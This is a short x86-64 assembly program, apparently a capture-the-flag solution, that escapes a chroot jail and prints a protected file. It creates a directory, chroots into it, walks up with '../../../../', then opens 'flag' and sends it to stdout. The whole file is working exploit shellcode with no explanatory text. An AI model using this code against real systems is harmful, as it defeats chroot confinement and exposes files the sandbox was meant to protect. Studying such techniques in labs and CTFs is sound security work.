%define SYS_chdir  0x50
%define SYS_chroot 0xa1
%define SYS_mkdir  0x53 
%define SYS_open   0x2  
%define SYS_read   0x0
%define SYS_write  0x1
%define SYS_sendfile 0x28

global _start
_start:
    
    mov rax, SYS_mkdir
    lea rdi, [rel myroot]
    mov rsi, 664
    syscall

    mov rax, SYS_chroot
    lea rdi, [rel myroot]
    syscall

    mov rax, SYS_chdir
    lea rdi, [rel dots]
    syscall

    mov rax, SYS_open
    lea rdi, [rel flag]
    xor rsi, rsi
    mov rdx, 2
    syscall

    mov rsi, rax
    mov rdi, 1
    mov rax, SYS_sendfile
    xor rdx, rdx
    mov r10, 0x1000
    syscall

flag:
    db "flag", 0

dots:
    db "../../../../", 0

busybox:
    db "busybox", 0

myroot:
    db "myroot", 0



